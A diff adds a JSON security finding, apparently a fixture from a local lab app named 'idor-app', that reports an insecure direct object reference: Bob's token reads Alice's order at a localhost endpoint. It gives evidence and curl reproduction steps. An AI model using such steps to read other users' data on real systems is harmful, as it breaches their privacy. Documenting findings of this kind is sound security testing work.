@@ -1,0 +1,24 @@
+{
+  "threshold": [
+    "high"
+  ],
+  "program": "idor-app",
+  "findings": [
+    {
+      "title": "Bob can read Alice's order due to missing ownership authorization",
+      "asset": "http://127.0.0.1:8901/v2/orders/1001",
+      "class": "broken_access_control",
+      "confidence": "high",
+      "evidence": [
+        "GET /v2/orders/1001 with Authorization: Bearer bob-token returned HTTP 200 and Alice's order data: {\"id\":1001,\"owner\":\"alice\",\"total\":\"184.00\",\"shipping_address\":\"1 Acacia Road, Springfield\"}",
+        "GET /v2/orders/1002 with Bob's own token returned his owned order, confirming the token was valid and not accidentally requesting an owned resource",
+        "The receipt endpoint correctly responds with HTTP 403 {\"error\":\"not your order\"} for /v2/orders/1001/receipt using the same Bob token, showing ownership enforcement exists but is absent on /v2/orders/{id}"
+      ],
+      "repro_steps": [
+        "curl -i -H 'Authorization: Bearer bob-token' http://127.0.0.1:8901/v2/orders/1002",
+        "curl -i -H 'Authorization: Bearer bob-token' http://127.0.0.1:8901/v2/orders/1001",
+        "curl -i -H 'Authorization: Bearer bob-token' http://127.0.0.1:8901/v2/orders/1001/receipt"
+      ]
+    }
+  ]
+}
